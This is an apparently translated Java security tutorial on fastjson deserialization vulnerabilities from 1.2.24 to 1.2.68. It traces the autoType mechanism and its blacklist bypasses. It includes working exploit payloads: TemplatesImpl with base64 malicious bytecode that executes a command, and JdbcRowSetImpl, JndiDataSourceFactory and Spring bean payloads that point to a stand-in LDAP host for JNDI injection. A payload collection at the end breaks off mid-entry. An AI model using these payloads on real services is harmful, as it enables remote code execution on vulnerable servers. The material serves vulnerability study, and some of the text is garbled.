# Java Security Learningâ€”fastjson Deserialization Vulnerability

Author: H3rmesk1t

Data: 2022.02.07

## fastjson introduction

`Fastjson` is a high-performance JSON library written in the Java language developed by Alibaba. It is used to convert data between `JSON` and `JSON Object` and provides two main interfaces `JSON.toJSONString` and `JSON.parseObject`/`JSON.parse` to implement serialization and deserialization operations respectively.

## Scope of impact

```text
Fastjson < 1.2.68
```

## fastjson learning

There are two types of `fastjson` operations, one is to serialize `Java Bean` to `JSON` string, and the other is to deserialize `JSON` string to `Java Bean`.

### Class - JSON

The common method to serialize `JSON` strings is `JSON.toJSONString()`. This method has many overloaded methods, among which the commonly used parameters are as follows:
 - Serialization features: `com.alibaba.fastjson.serializer.SerializerFeature`, you can use multiple features globally in `FastjsonConfig`, or you can specify features in the specific method.
 - Serialization filter: `com.alibaba.fastjson.serializer.SerializeFilter`, this is an interface, and custom serialization can be implemented in extended programming by configuring its subinterface or implementing classes.
 - Configuration during serialization: `com.alibaba.fastjson.serializer.SerializeConfig`, you can add serialization configurations customized with feature types.

### JSON-class

Common methods for deserializing the `JSON` string to `Java Bean` are `parse`, `parseObject`, and `parseArray`. These three methods also contain many overloaded methods, among which the commonly used parameters are as follows:
 - Deserialization features: `com.alibaba.fastjson.parser.Feature`.
 - Class type: `java.lang.reflect.Type`, the type used to perform deserialization of the class.
 - Handling generic deserialization: `com.alibaba.fastjson.TypeReference`.
 - Programmatic extension custom deserialization: `com.alibaba.fastjson.parser.deserializer.ParseProcess`, for example `ExtraProcessor` is used to handle redundant fields, and `ExtraTypeProvider` is used to provide type information when processing redundant fields.

### Functional Points

Here is a look at the framework diagram of the earlier version of `fastjson`.

![fastjson framework diagram](./images/1.png)

The main functional points are:
 - Use `JSON.parse(jsonString)` and `JSON.parseObject(jsonString, Target.class)`. The call chains of the two are the same. The former will parse the string in `jsonString` to get the class specified by `@type`, and the latter will directly use `class` in the parameter.
 - Fastjson` will call the `getter`/`setter` method that meets the criteria in the class by reflection when creating a class instance.
    - The `getter` method needs to meet the conditions:
      - The method name is longer than `4`.
      - Not a static method.
      - Starting with `get` and the `4th` position is capital letter.
      - The method cannot be passed in with parameters.
      - Inherited from `Collection`|`Map`|`AtomicBoolean`|`AtomicInteger`|`AtomicLong`.
      - This property does not have a `setter` method.
    - The `setter` method needs to meet the conditions:
      - The method name is longer than `4`.
      - Starting with `set` and the `4th` position is capital letter.
      - Non-static method.
      - Return type is `void` or the current class.
      - The number of parameters is `1`.
    - The specific logic is in `com.alibaba.fastjson.util.JavaBeanInfo.build()`.

 - Using `JSON.parseObject(jsonString)` will return the `JSONObject` object, and all `getters` and `setters` in the class are called.
 - If the private variable in the target class does not have a `setter` method, but still wants to assign a value to this variable during deserialization, you need to use the `Feature.SupportNonPublicField` parameter.
 - Fastjson` When looking for the `get`/`set` method for class attributes, call the function `com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()` method, which will ignore the `_`|`-` string, that is, even if your field is called `_a_g_e_`, the `getter` method is `getAge()`, and `fastjson` can also be found. In version 1.2.36 and subsequent versions, it can also support the use of `_` and `-` for combination obfuscation.
 - When deserializing `fastjson`, if the `Field` type is `byte[]`, `com.alibaba.fastjson.parser.JSONScanner#bytesValue` will be called for base64` decoding. For the corresponding `base64` encoding will also be performed during serialization.

## fastjson serialization and deserialization
### Serialization
The sample code is as follows:
 - Demo.java

```java
package org.h3rmesk1t.fastjson.demo;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/2/7 8:08 pm
 */
public class Demo {

    private String name;

    public Demo() {
        System.out.println("constructor");
    }

    public String getName() {
        System.out.println("getName");
        return name;
    }

    public void setName(String name) {
        System.out.println("setName");
        this.name = name;
    }
}
```

 - SerialDemo.java

```java
package org.h3rmesk1t.fastjson.demo;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.serializer.SerializerFeature;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/2/7 8:12 pm
 */
public class SerialDemo {

    public static void main(String[] args) {

        Demo demo = new Demo();
        demo.setName("h3rmesk1t");

        String jsonString = JSON.toJSONString(demo, SerializerFeature.WriteClassName);
        System.out.println("SerialResult with SerializerFeature.WriteClassName...");
        System.out.println(jsonString);

        String jsonStringWithoutSerializerFeatureWriteClassName = JSON.toJSONString(demo);
        System.out.println("SerialResult without SerializerFeature.WriteClassName...");
        System.out.println(jsonStringWithoutSerializerFeatureWriteClassName);
    }
}
```

 - Running results

![SerialResult](./images/2.png)

Note that there is a keyword `SerializerFeature.WriteClassName` in the above code, which is a property value set by `toJSONString`. After setting, it will write an additional `@type` when serializing, that is, write the serialized class name. `type` can specify the deserialized class and call its `getter`/`setter`/`is` method.

### Deserialization
The sample code is as follows:
 - UnSerialDemo.java

```java
package org.h3rmesk1t.fastj
son.demo;

import com.alibaba.fastjson.JSON;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/2/7 8:25 pm
 */
public class UnSerialDemo {

    public static void main(String[] args) {

        String jsonStringWithoutType = "{\"name\":\"h3rmesk1t\"}";
        String jsonStringWithType = "{\"@type\":\"org.h3rmesk1t.fastjson.demo.Demo\",\"name\":\"h3rmesk1t\"}";

        // JSON.parse without type
        System.out.println("parse...");
        System.out.println(JSON.parse(jsonStringWithoutType));

        // JSON.parseObject without type
        System.out.println("parseObject...");
        System.out.println(JSON.parseObject(jsonStringWithoutType));

        // JSON.parseObject(text, Class) without type
        System.out.println("parseObject(text, Class)...");
        System.out.println(JSON.parseObject(jsonStringWithType, Demo.class));

        // JSON.parse with type
        System.out.println("parse...");
        System.out.println(JSON.parse(jsonStringWithType));
        
        // JSON.parseObject with type
        System.out.println("parseObject...");
        System.out.println(JSON.parseObject(jsonStringWithType));
    }
}
```

 - Running results

![UnSerialResultWithType](./images/3.png)

![UnSerialResultWithoutType](./images/4.png)

From the running results, we can see that the first and second methods failed to deserialize successfully. This is because it cannot be determined which object it belongs to, so it can only be converted into an ordinary `JSON` object and cannot be converted correctly. The third method successfully deserializes because it indicates the object. After introducing `@type`, it is successfully deserialized. You can see that `parse` successfully triggered the `set` method, and `parseObject` triggered both `set` and `get` methods, because `fastjson` has an autoType` mechanism. When the user specifies `@type`, there is a malicious `setter`/`getter` call, which is the `fastjson` deserialization vulnerability.

## Fastjson Deserialization Vulnerability Basics
### Basic principles of deserialization vulnerability
In the previous example code, we learned about the autoType mechanism of `Fastjson` and also learned that the reason for the deserialization vulnerability is that there are malicious operations in the `get` or `set` methods. The following `demo` is an example:

 - Exploit.java

```java
package org.h3rmesk1t.fastjson.demo;

import java.io.IOException;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/2/7 9:06 pm
 */
public class Exploit {

    private String name;

    public String getName() {
        System.out.println("getName");
        return name;
    }

    public void setName(String name) throws IOException {
        System.out.println("setName");
        this.name = name;
        Runtime.getRuntime().exec("open -a Calculator");
    }
}
```

 - UnExploit.java

```java
package org.h3rmesk1t.fastjson.demo;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.serializer.SerializerFeature;

import java.io.IOException;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/2/7 9:09 pm
 */
public class UnExploit {

    public static void main(String[] args) throws IOException {

// Exploit exp = new Exploit();
// exp.setName("h3rmesk1t");
// String jsonString = JSON.toJSONString(exp, SerializerFeature.WriteClassName);
// System.out.println(jsonString);

        String jsonString = "{\"@type\":\"org.h3rmesk1t.fastjson.demo.Exploit\",\"name\":\"h3rmesk1t\"}";
        System.out.println(JSON.parseObject(jsonString));
    }
}
```

![exploit](./images/5.png)

### Deserialization vulnerability process analysis
Set a breakpoint at `parseObject`, follow up on the `Feature#parseObject` method, and the `Feature#parse` method will be called in the first line.

![Feature#parseObject](./images/6.png)

Follow up on the `Feature#parse` method and continue to follow up on `parse`. Here, a `DefaultJSONParser` object will be created. In this process, there will be a judgment operation to determine whether the parsed string is `{` or `[`, and set the `token` value according to the judgment result. After creating the `DefaultJSONParser` object, enter the `DefaultJSONParser#parse` method.

![Feature#parse](./images/7.png)

![parse](./images/8.png)

![DefaultJSONParser](./images/9.png)

Follow up on the `DefaultJSONParser#parse` method, in this process, you will get the previously set `token` value and perform corresponding operations based on the `token` value. The judgment process will create an empty `JSONObject` and then parse it through the `parseObject` method.

![tokenget](./images/10.png)

![switch](./images/11.png)

Follow up on the `parseObject` method, here you will get the `@type` specified class through `scanSymbol`, and then load `Class` through `TypeUtils.loadClass` method.

![parseObjectOfscanSymbol](./images/12.png)

![parseObjectOfloadClass](./images/13.png)

Follow up on the `TypeUtils.loadClass` method, first we will look for the class from `mappings`. There are some built-in Java classes in `mappings`. Since some of the previous conditions are not met, the class is finally loaded with `ClassLoader`, which is the Exploit class.

![TypeUtils.loadClass](./images/14.png)

Return to the previous level after returning the `clazz` value, create the `ObjectDeserializer` object, and call the `getDeserializer` method.

![ObjectDeserializer](./images/15.png)

Follow up on the `ParserConfig#getDeserializer` method and continue to call `getDeserial
The izer` method is used here to restrict classes that can be deserialized, but there is only `java.lang.Thread` in the blacklist.

![ParserConfig#getDeserializer](./images/16.png)

![getDeserializer](./images/17.png)

Then go back to the previous `deserialze` method, and debug the temporary code generated by the `ASM` mechanism, and finally call the methods in `set` and `get`.

![deserialze](./images/18.png)

## Fastjson 1.2.24
This version of `Fastjson` has two exploit chains:
 1. JdbcRowSetImpl
 2. Templateslmpl

### TemplatesImpl Deserialization
#### analyze

The `TemplatesImpl` class is located in `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`, implementing the `Serializable` interface, so it can be serialized.

Notice that there is a member property `_class` in this class, which is an array of type `Class`. The class marked `_transletIndex` in the array will be instantiated using `newInstance` in the `getTransletInstance` method.

![getTransletInstance](./images/19.png)

Following up on the call of `getTransletInstance`, I found that `newTransformer` will call the `getTransletInstance` method, and the `getOutputProperties` method in the class will call the `newTransformer` method.

![newTransformer](./images/20.png)

![getOutputProperties](./images/21.png)

The `getOutputProperties` method is the `getter` method of the class member variable `_outputProperties`.

![_outputProperties](./images/22.png)

Since a call chain can be formed here, go back to the initial `_class` and see if the classes are controllable. I found that there are assignment actions in the construction method, the `readObject` method and the `defineTransletClasses` method.

![_class](./images/23.png)

When `getTransletInstance` method `_class==null`, the `defineTransletClasses` method will be called, and the method will be followed up to see the logic of the code. First, `_bytecodes` is required not to be empty, and then the custom `ClassLoader` will be called to load `byte[]` in `_bytecodes`, and `_bytecodes` is also a member property of this class. If the parent class of this class is `ABSTRACT_TRANSLET`, that is `com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`, the `_transletIndex` of the class member property will be set to the mark bit in the current loop. If it is the first call, it is `_class[0]`; if the parent class is not this class, an exception will be thrown.

![defineTransletClasses](./images/24.png)

#### Call chain

According to the above analysis process, it is not difficult to obtain a call chain:
 - Construct a deserialized string of the `TemplatesImpl` class, where `_bytecodes` is the class bytecode of the malicious class we constructed. The parent class of this class is `AbstractTranslet`. Finally, this class will be loaded and instantiated using `newInstance`.
 - During the deserialization process, since the `getter` method `getOutputProperties` meets the condition, it will be called by `fastjson`, and this method triggers the entire vulnerability exploitation process.

```java
getOutputProperties() ->
newTransformer() ->
getTransletInstance() ->
defineTransletClasses() / EvilClass.newInstance()
```

#### Payload
It should be noted that in order to meet the fact that no exception or exit is reported before the vulnerability point is triggered, the `_name` is not `null` and `_tfactory` is not `null` is needed. Since some private variables that need to be changed do not have a `setter` method, the `Feature.SupportNonPublicField` parameter needs to be triggered.

 - POC.java

```java
package org.h3rmesk1t.fastjson.fastjson124;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.codec.binary.Base64;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/2/7 11:18 pm
 */
public class POC {

    public static class H3rmesk1t {

    }

    public static String makeClass() throws Exception {

        ClassPool pool = ClassPool.getDefault();
        CtClass cc = pool.get(H3rmesk1t.class.getName());
        String cmd = "java.lang.Runtime.getRuntime().exec(\"open -a Calculator\");";
        cc.makeClassInitializer().insertBefore(cmd);
        String randomClassName = "H3rmesk1t" + System.nanoTime();
        cc.setName(randomClassName);
        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));
        byte[] evilCode = cc.toBytecode();

        return Base64.encodeBase64String(evilCode);
    }

    public static String exploitString() throws Exception {

        String evilCodeBase64 = makeClass();
        final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
        String exploit = â€‹â€‹"{'d1no':{" +
                "\"@type\":\"" + NASTY_CLASS + "\"," +
                "\"_bytecodes\":[\"" + evilCodeBase64 + "\"]," +
                "'_name':'h3rmesk1t'," +
                "'_tfactory':{}," +
                "'_outputProperties':{}" +
                "}}\n";

        return exploit;
    }

    public static void main(String[] args) throws Exception {

        String exploit = â€‹â€‹exploitString();
        System.out.println(exploit);
        // JSON.parse(exploit, Feature.SupportNonPublicField);
        // JSON.parseObject(exploit, Feature.SupportNonPublicField);
        // JSON.parseObject(exploit, Object.class, Feature.SupportNonPublicField);
    }
}
```

![result1](./images/25.png)

 - Payload

```java
{'d1no':{"@type":"c
om.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["yv66vgAAADQAJgoAAwAPBwAhBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbm VOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAlIM3JtZXNrMXQBAAxJbm5lckNsYXNzZXMBADJMb3JnL2gzcm1lc2sxdC9mYXN0anNvbi9mYXN0anNvbjEyNC9 QT0MkSDNybWVzazF0OwEAClNvdXJjZUZpbGUBAAhQT0MuamF2YQwABAAFBwATAQAwb3JnL2gzcm1lc2sxdC9mYXN0anNvbi9mYXN0anNvbjEyNC9QT0MkSDNybWVzazF0AQAQamF2YS9 sYW5nL09iamVjdAEAJm9yZy9oM3JtZXNrMXQvZmFzdGpzb24vZmFzdGpzb24xMjQvUE9DAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAFQEACmdldFJ1bnRpbWUBABUoKUxq YXZhL2xhbmcvUnVudGltZTsMABcAGAoAFgAZAQASb3BlbiAtYSBDYWxjdWxhdG9yCAAbAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAHQAe CgAWAB8BABdIM3JtZXNrMXQyOTQ5ODk5MDkyNjIxOAEAGUxIM3JtZXNrMXQyOTQ5ODk5MDkyNjIxODsBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVud GltZS9BYnN0cmFjdFRyYW5zbGV0BwAjCgAkAA8AIQACACQAAAAAAIAIAAQAEAAUAQAGAAAALwABAAEAAAAFKrcAJbEAAAAACAAAAAAAAAAAAAQAAAAAAAFKrcAJbEAAAAAACAAAAAAAAAAAQAAAAAAAFAAkAIgAAAAAAGAF AAFAAEABgAAABYAAgAAAAAAACrgAGhIctgAgV7EAAAAAAAIAIADQAAAAAAIADgALAAAACgABAAIAEAAKAAk="],'_name':'h3rmesk1t','_tfactory':{},'_outputProperties':{}}}
```

### JdbcRowSetImpl Deserialization
#### analyze
The `JdbcRowSetImpl` class is located in `com.sun.rowset.JdbcRowSetImpl`. The core point of this exploit chain is the `JNDI` injection caused by the controllable parameter of `javax.naming.InitialContext#lookup.

Since the trigger point of `fastjson` uses the `set`/`get` method, you can find available methods in `JdbcRowSetImpl` and follow up on the `setAutoCommit` method. When `this.conn` is empty, the `this.connect` method will be called.

![setAutoCommit](./images/26.png)

Follow up on the `connect` method, the `javax.naming.InitialContext#lookup` method is called, and the parameters are obtained from the member variable `dataSource`.

![connect](./images/27.png)

#### Call chain

```java
JdbcRowSetImpl object recovery ->
setDataSourceName method call ->
setAutocommit method call ->
context.lookup(datasourceName) call
```
#### Payload

 - POC.java

```java
package org.h3rmesk1t.fastjson.fastjson124;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/2/8 12:25 AM
 */
public class POC2 {

    public static void main(String[] args) {

        String jsonString = "{\n" +
                "\t\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n" +
                "\t\"dataSourceName\":\"ldap://127.0.0.1:8888/evilObject\",\n" +
                "\t\"autoCommit\":true\n" +
                "}";
        JSON.parse(jsonString);
        JSON.parseObject(jsonString);
        JSON.parseObject(jsonString, Feature.SupportNonPublicField);
    }
}
```

![result2](./images/28.png)

```java
{
	"@type":"com.sun.rowset.JdbcRowSetImpl",
	"dataSourceName":"ldap://127.0.0.1:8888/evilObject",
	"autoCommit":true
}
```

## Fastjson 1.2.25 Deserialization Vulnerability
In the version of `Fastjson 1.2.2`, the official fixed the previous deserialization vulnerability and introduced the `checkAutoType` security mechanism. By default, the `autoTypeSupport` is closed and no arbitrary classes cannot be deserialized directly. After opening `AutoType`, it is based on the built-in blacklist to achieve security. `fastjson` also provides an interface to add blacklists.

Security updates are mainly focused on `com.alibaba.fastjson.parser.ParserConfig`, and several member variables appear on the class:
 - `autoTypeSupport`: Used to identify whether deserialization of any type is enabled and is turned off by default.
 - `denyList`: Blacklist of deserialization classes.
 - `acceptList`: is a deserialized whitelist.

![ParserConfig](./images/29.png)

Blacklist `denyList` includes:

```java
bsh
com.mchange
com.sun.
java.lang.Thread
java.net.Socket
java.rmi
javax.xml
org.apache.bcel
org.apache.commons.beanutils
org.apache.commons.collections.Transformer
org.apache.commons.collections.functors
org.apache.commons.collections4.comparators
org.apache.commons.fileupload
org.apache.myfaces.context.servlet
org.apache.tomcat
org.apache.wicket.util
org.codehaus.groovy.runtime
org.hibernate
org.jboss
org.mozilla.javascript
org.python.core
org.springframework
```

Add deserialization whitelist method:
 - Add with code: `ParserConfig.getGlobalInstance().addAccept("org.h3rmesk1t.fastjson.,org.javaweb.")`
 - Add JVM startup parameters: `-Dfastjson.parser.autoTypeAccept=org.h3rmesk1t.fastjson`
 - Add in `fastjson.properties`: `fastjson.parser.autoTypeAccept=org.h3rmesk1t.fastjson`

### analyze

Follow up on `ParserConfig#checkAutoType`, you can see that if `autoType` is enabled, you will first determine whether the class name is in the whitelist. If it is, use `TypeUtils.loadClass` to load; otherwise, you will use blacklist to judge the beginning of the class name, and throw an exception if it matches.

![ParserConfig#checkAutoType1](./images/30.png)

If `autoType` is not enabled, blacklist matching will be used first, and then whitelist matching and loading will be used. Finally, if the class to be deserialized does not match the black and whitelist, `TypeU will be called only if `autoType` or `expectClass` is enabled and not empty, that is, `Class` object is specified.
tils.loadClass` loads.

![ParserConfig#checkAutoType2](./images/31.png)

Then follow up on the `TypeUtils.loadClass` method. A logical vulnerability occurred in this method. In order to be compatible with class names with descriptors before loading the target class, this class uses recursive calls to handle the `[`, `L`, `;` characters in the descriptor. Attackers can use classes with descriptors to bypass the blacklist restrictions, and during class loading, the descriptors will be processed.

![](./images/32.png)

Therefore, the idea of â€‹â€‹exploitation is: `autoType` needs to be turned on and blacklisted bypass using `[`, `L`, `;` characters.

### Payload

```java
{
	"@type":"Lcom.sun.rowset.JdbcRowSetImpl;",
	"dataSourceName":"ldap://127.0.0.1:8888/evilObject",
	"autoCommit":true
}
```

## Fastjson 1.2.42
### analyze

In the version `Fastjson 1.2.42`, `fastjson` continues to continue the detection mode of black and white lists, but in order to prevent security researchers from conducting reverse research based on classes in blacklists, the blacklist class was modified from whitelists to using `HASH` for comparison, and used to attack unupdated historical versions. At the same time, the author tried to fix the problem of using class descriptors to bypass blacklist verification that had been present in previous versions.

`com.alibaba.fastjson.parser.ParserConfig` converts the original plaintext blacklist to a `Hash` blacklist. And adds judgment in `checkAutoType`. If the first character of the class is `L` and ends with `;`, then `substring` is removed. However, it is recursively processed at the last time, so just double-write the descriptor to bypass it.

![denyHashCodes](./images/33.png)

### Payload

```java
{
	"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;",
	"dataSourceName":"ldap://127.0.0.1:8888/evilObject",
	"autoCommit":true
}
```

## Fastjson 1.2.43
### analyze
This version mainly fixes the problem of double write bypass in the previous version.

```java
if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(className.length() - 1)) * 1099511628211L == 655701488918567152L) {
    if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(1)) * 1099511628211L == 655656408941810501L) {
        throw new JSONException("autoType is not support. " + typeName);
    }

    className = className.substring(1, className.length() - 1);
}
```

As you can see from the code, the checkAutoType code used to check adds judgment. If two `L` appears in a row, an exception will be thrown. In this way, the idea of â€‹â€‹using `L` and `;` is blocked. However, in the process of `loadClass`, it is also processed and recursive for `[`, so it can still be bypassed.

### payload

```java
{
    "@type":"[com.sun.rowset.JdbcRowSetImpl"[{,
    "dataSourceName":"ldap://127.0.0.1:8888/evilObject",
	"autoCommit":true
}
```

## Fastjson 1.2.44
### analyze
This version mainly fixes the issue of using `[` to bypass blacklist protection in the previous version.

```java
long BASIC = -3750763034362895579L;
long PRIME = 1099511628211L;
long h1 = (-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L;
if (h1 == -5808493101479473382L) {
    throw new JSONException("autoType is not support. " + typeName);
} else if ((h1 ^ (long)className.charAt(className.length() - 1)) * 1099511628211L == 655701488918567152L) {
    throw new JSONException("autoType is not support. " + typeName);
}
```

As you can see from the code, a new judgment was added to the `checkAutoType`, and if the class name starts with `[`, an exception will be directly thrown. Therefore, the blacklist bypass caused by string processing has come to an end.

## Fastjson 1.2.45
### analyze

This version revealed a blacklist bypass.

### payload

```java
{
    "@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",
    "properties":{
        "data_source":"ldap://127.0.0.1:8888/evilObject"
    }
}
```

## Fastjson 1.2.47
### analyze

In the `Fastjson 1.2.47` version, the most serious vulnerability was exposed. It can be used for deserialization without turning on `AutoTypeSupport`. And the bypass problem in this version is still in the `checkAutoType` method.

Analyze the key codes bypassed this time. The following code is a familiar patch before, that is, the class name starts with `[` and the class name starts with `L` and the class name ends with `;`. When both are in line, enter the logic of the code below. When `autoTypeSupport` is true` and `expectClass` is not `null`, first compare the `acceptHashCodes` to load the whitelist item, and when it meets, call the `TypeUtils.loadClass` method. When it is not in the whitelist, compare `denyHashCodes` for blacklist matching. If there is a match for the blacklist and the class is not cached in `TypeUtils.mappings`, an exception is thrown. Then try to find the cached `class` in `TypeUtils.mappings` and find this class in `deserializers`. If the corresponding `class` is found, the `return` will be performed.

```java
// When autoTypeSupport is true, first compare acceptHashCodes to load whitelist items
if (this.autoTypeSupport || expectClass != null) {
    hash = h3;

    for(i = 3; i < className.length(); ++i) {
        hash ^= (long)className.charAt(i);
        hash *= 1099511628211L;
        if (Arrays.binarySearch(this.acceptHashCodes, hash) >= 0) {
            clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, false);
            if (clazz != null) {
                return clazz;
            }
        }
        // Blacklist match in comparison denyHashCodes
        // If the blacklist matches and the class is not cached in TypeUtils.mappings
        // Abnormal is thrown
        if (Arrays.binarySearch(this.denyHashCodes, hash) >= 0 && TypeUtils.getClassFromMapping(typeName) == null) {
            throw new JSONException("autoType is not support. " + typeName);
        }
    }
}

// Try to find cached class in TypeUtils.mappings
if (clazz == null) {
    CLA
zz = TypeUtils.getClassFromMapping(typeName);
}

// Try to find this class in deserializers
if (clazz == null) {
    clazz = deserializers.findClass(typeName);
}

// If the corresponding class is found, return will be performed
if (clazz != null) {
    if (expectClass != null
            && clazz != java.util.HashMap.class
            && !expectClass.isAssignableFrom(clazz)) {
        throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
    }

    return clazz;
}
```

From the above code analysis process, we can see that there is a logical problem here: When `autoTypeSupport` is `true`, `fastjson` will also prohibit deserialization of some blacklisted classes, but there is a judgment condition, that is, an exception will be thrown when the deserialized class is in the blacklist and there is no cache of the class in `TypeUtils.mappings`.

When `autoTypeSupport` is the default `false`, the program directly checks the blacklist and throws an exception. This part cannot be bypassed, so the focus is before judgment. The program tries to find the class to be deserialized in `TypeUtils.mappings` and `deserializers`. If it is found, it will `return`, which avoids the check when `autoTypeSupport` defaults to `false`.

According to the above idea, follow up with `deserializers` first, which is a `IdentityHashMap` object, and the functions that can assign values â€‹â€‹to are:
 - getDeserializer: This class is used to load some specific classes and classes with `JSONType` annotation. Before `put`, there are judgments on class names and related information, and cannot be used.
 - initDeserializers: No entry parameters, called in the constructor method, write some fixed commonly used classes that are considered to be unharmful and cannot be used.
 - putDeserializer: Called by the first two functions, it cannot control the entry parameters and cannot be utilized.

![deserializers](./images/34.png)

Next, look at `TypeUtils.mappings`, which is a `ConcurrentHashMap` object, and the functions that can assign values â€‹â€‹to are:
 - addBaseClassMappings: No entry parameters, load.
 - loadClass: key function.

Follow up on the `loadClass` method. It is not difficult to see in the following code that as long as you can control the parameters of this method, you can write any class name into `mappings`.

```java
try{
    // If the classLoader is not empty and cache is true, it is loaded using the class loader and stored in mappings
    if(classLoader != null){
        clazz = classLoader.loadClass(className);
        if (cache) {
            mappings.put(className, clazz);
        }
        return clazz;
    }
} catch(Throwable e){
    e.printStackTrace();
    // skip
}
// If the classLoader fails, or if the ClassLoader is not specified, the current thread's contextClassLoader is used to load the class. The cache is also required to be true to be written to mappings
try{
    ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();
    if(contextClassLoader != null && contextClassLoader != classLoader){
        clazz = contextClassLoader.loadClass(className);
        if (cache) {
            mappings.put(className, clazz);
        }
        return clazz;
    }
} catch(Throwable e){
    // skip
}
// If it still fails, use Class.forName to get the class object and put it in mappings
try{
    clazz = Class.forName(className);
    mappings.put(className, clazz);
    return clazz;
} catch(Throwable e){
    // skip
}
```

There are three overload methods in `loadClass`. Here we will focus on where to call the `loadClass` method of the two parameters.

![loadClass](./images/35.png)

![Call](./images/36.png)

Follow up on the `com.alibaba.fastjson.serializer.MiscCodec#deserialze` method. This class is used to deal with some messy deserialization classes, including the `Class.class` class. If `parser.resolveStatus` is `2`, enter the `if` statement, and parse the content in `val` and put it in `objVal`, and then pass it into `strVal`.

![](./images/37.png)

![](./images/38.png)

In the following logic, if `class` is `Class.class`, the `loadClass` method will be called, and `strVal` is loaded and cached, which completes the loading of the malicious class.

![](./images/39.png)

According to the above idea, debug `{"@type":"java.lang.Class","val":"aaaaa"}`, `JSON.parseObject` first call `DefaultJSONParser` to parse `JSON`.

![](./images/40.png)

`DefaultJSONParser.parseObject` calls `checkAutoType` to check the legality of the class to be loaded.

![](./images/41.png)

Since deserializers loads `Class.class` when initializing, it can be found using `findClass`, which is beyond the subsequent check of `AutoTypeSupport`.

![](./images/42.png)

`DefaultJSONParser.parseObject` sets `resolveStatus` to `2`.

![](./images/43.png)

`DefaultJSONParser.parseObject` assigns `deserialzer` according to different `class` types, `Class` type is processed by `MiscCodec.deserialze`.

![](./images/44.png)

Then pass to `strVal` and load and cache using `loadClass`.

![](./images/45.png)

![](./images/46.png)

At this time, the malicious val` is successfully loaded into `mappings`. When a malicious class is requested again, the blacklist can be blocked by bypassed.

### Payload

```java
{
	"demo1": {
		"@type": "java.lang.Class",
		"val": "com.sun.rowset.JdbcRowSetImpl"
	},
	"demo2": {
		"@type": "com.sun.rowset.JdbcRowSetImpl",
		"dataSourceName":"ldap://127.0.0.1:8888/evilObject",
		"autoCommit": true
	}
}
```

## Fastjson 1.2.68
### analyze

After the `Fastjson 1.2.47` version vulnerability broke out, the official fixed the vulnerability in `Fastjson 1.2.48`. In the `MiscCodec` processed the Class class, the `cache` was set to `false`, and the default call of the overloaded method of the `loadClass` was changed to not cache, which avoided the use of `Class` to cache malicious class names in advance. Until a new vulnerability exploit appeared in the `Fastjson 1.2.68` version, using `expectClass` to bypass `checkAutoType`.

Version `Fastjson 1.2.47` has updated a new security control point `safeMode`. If the application enables `safeMode`, an exception will be directly thrown in `checkAutoType`. This method is to completely prohibit `autoType`.

![](./images/47.png)

But it appears in this version
A new way of bypassing: use `expectClass` to bypass `checkAutoType`. There is such logic in the `checkAutoType` function: If the function has the `expectClass` parameter, and the class name passed is a subclass or implementation of `expectClass` and is not in the blacklist, you can pass the security detection of `checkAutoType`.

![](./images/48.png)

According to the above idea, I found whether there is a controllable `expectClass` parameter entry method among the several overloading methods of `checkAutoType`, and finally found the following classes:
 - ThrowableDeserializer#deserialze
 - JavaBeanDeserializer#deserialze

Follow up on the `ThrowableDeserializer#deserialze` method, which directly passes the class after `@type` into `checkAutoType`, and the `expectClass` is `Throwable.class`.

![](./images/49.png)

After checkAutoType, createException will be used to create an instance of the exception class. This forms the way the Throwable subclass bypasses checkAutoType. We need to find a subclass of Throwable, which contains threatening code logic in the getter/`setter`/`static block`/`constructor. Similar to Throwable, there is also AutoCloseable (in the whitelist).

![](./images/50.png)

## Payload Collection

 - JdbcRowSetImpl

```java
{
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName":"ldap://127.0.0.1:8888/evilObject",
    "autoCommit": true
}
```

 - TemplatesImpl

```java
{
	"@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
	"_bytecodes": ["yv66vgA...k="],
	'_name': 'h3rmesk1t',
	'_tfactory': {},
	"_outputProperties": {},
}
```

 - JndiDataSourceFactory

```java
{
    "@type": "org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",
    "properties": {
      "data_source":"ldap://127.0.0.1:8888/evilObject"
    }
}

```

 - SimpleJndiBeanFactory

```java
{
    "@type": "org.springframework.beans.factory.config.PropertyPathFactoryBean",
    "targetBeanName": "ldap://127.0.0.1:8888/evilObject",
    "propertyPath": "h3rmesk1t",
